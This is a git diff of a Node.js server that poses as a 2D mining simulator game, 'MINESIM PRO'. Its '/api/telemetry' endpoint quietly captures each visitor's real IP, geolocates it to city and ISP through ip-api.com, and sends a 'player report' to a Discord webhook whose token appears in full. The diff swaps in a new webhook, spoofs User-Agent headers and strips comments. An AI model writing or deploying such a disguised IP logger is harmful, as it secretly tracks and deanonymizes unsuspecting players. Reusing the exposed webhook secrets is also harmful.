@@ -5,8 +5,8 @@ const PORT = process.env.PORT || 3000;
 app.set('trust proxy', true);
 app.use(express.json());
 
-// PEGA AQUÍ LA URL DE TU WEBHOOK DE DISCORD
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161075820793916/e5CYvM8GzZeNSFGUW_xYjxa9xbQDX6XgPpjGWrqUU1il2hy1ddb6h_TPT5MATQY3T4Yi";
+// PEGA AQUÍ TU NUEVO WEBHOOK DE DISCORD
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161653523255379/_LaPPSocrBnSYKF0TD5gwCDMBl3FXjYyoImmLRiEd6AAl1c1F9IULR7m2--mgP6RN8Ea";
 
 app.post('/api/telemetry', async (req, res) => {
     let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
@@ -17,7 +17,7 @@ app.post('/api/telemetry', async (req, res) => {
 
     try {
         const response = await fetch(`http://ip-api.com/json/${userIp}?fields=country,city,isp,status`, {
-            headers: { 'User-Agent': 'Mozilla/5.0' }
+            headers: { 'User-Agent': 'MineSimBot/1.0' }
         });
         const geo = await response.json();
         if (geo.status === 'success') {
@@ -27,7 +27,6 @@ app.post('/api/telemetry', async (req, res) => {
         }
     } catch (e) {}
 
-    // 1. Imprimir en los logs de Render
     console.log(`\n========================================`);
     console.log(`🎯 [INFORME COMPLETO DE JUGADOR]`);
     console.log(`📍 IP Real: ${userIp}`);
@@ -35,11 +34,10 @@ app.post('/api/telemetry', async (req, res) => {
     console.log(`📡 ISP: ${isp}`);
     console.log(`========================================\n`);
 
-    // 2. Enviar reporte directo a Discord (Embed elegante)
     if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('http')) {
         const embed = {
-            title: "🎮 ¡Nuevo Jugador Conectado!",
-            color: 3828984, // Azul
+            title: "🎮 ¡Nuevo Jugador Detectado!",
+            color: 3828984,
             fields: [
                 { name: "📍 IP Real", value: `\`${userIp}\``, inline: true },
                 { name: "🌎 Ubicación", value: `${city}, ${country}`, inline: true },
@@ -55,17 +53,24 @@ app.post('/api/telemetry', async (req, res) => {
             timestamp: new Date().toISOString()
         };
 
-        fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] })
-        }).catch(err => console.error("Error al enviar a Discord:", err));
+        try {
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' 
+                },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        } catch (err) {
+            console.error("Error al enviar a Discord:", err);
+        }
     }
 
     res.sendStatus(200);
 });
 
-// Simulador de Minería 2D
+// Simulador 2D
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="es">
@@ -93,7 +98,7 @@ app.get('/', (req, res) => {
     <div id="menu">
         <div class="panel">
             <h1>MINESIM PRO</h1>
-            <p>Simulador de Minería Profunda v3.5</p>
+            <p>Simulador de Minería Profunda v3.6</p>
             <input type="text" id="miner-name" value="Minero_01" placeholder="Nombre">
             <button onclick="startSim()">INICIAR SIMULACIÓN</button>
         </div>
